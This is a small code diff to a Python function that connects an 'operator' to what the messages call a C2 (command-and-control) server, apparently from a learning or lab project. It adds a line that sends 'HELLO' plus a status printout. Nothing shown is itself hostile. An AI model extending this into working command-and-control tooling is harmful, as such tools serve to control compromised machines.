@@ -12,6 +12,9 @@ def server_connect():
         try:
             server_socket.connect((SERVER_IP, SERVER_PORT))
             print(f"[+] operator connected to server successfully")
+            server_socket.sendall(b"HELLO")
+            print(f"[+] message sent to {SERVER_IP}:{SERVER_PORT}")
+            
         except OSError as e:
             print(f"[-]couldn't connect to c2 server")
             print(f"{e}")
